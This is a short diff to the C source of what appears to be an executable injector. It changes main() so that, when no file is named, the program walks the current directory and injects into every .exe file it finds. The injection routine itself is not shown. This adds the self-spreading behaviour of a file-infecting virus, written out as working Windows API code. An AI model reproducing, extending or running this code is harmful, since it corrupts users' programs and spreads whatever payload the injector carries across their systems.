@@ -393,9 +393,27 @@ int inject(const char *filename) {
  * @return 0 on success, non-zero on failure.
  */
 int main(int argc, char **argv) {
-    if (argc != 2) {
-        printf("Usage: %s <exe file>\n", argv[0]);
-        return 1;
+    if (argc == 2) {
+        // Inject into the file passed as argument
+        return inject(argv[1]);
+    } else {
+        // Inject into all .exe files in the current directory
+        WIN32_FIND_DATAA findData;
+        HANDLE hFind = FindFirstFileA("*.exe", &findData);
+        if (hFind == INVALID_HANDLE_VALUE) {
+            printf("[ERROR] No .exe files found in current directory\n");
+            return 1;
+        }
+        int result = 0;
+        do {
+            printf("[INFO] Injecting into: %s\n", findData.cFileName);
+            int r = inject(findData.cFileName);
+            if (r != 0) {
+                printf("[ERROR] Injection failed for %s\n", findData.cFileName);
+                result = r;
+            }
+        } while (FindNextFileA(hFind, &findData));
+        FindClose(hFind);
+        return result;
     }
-    return inject(argv[1]);
 }
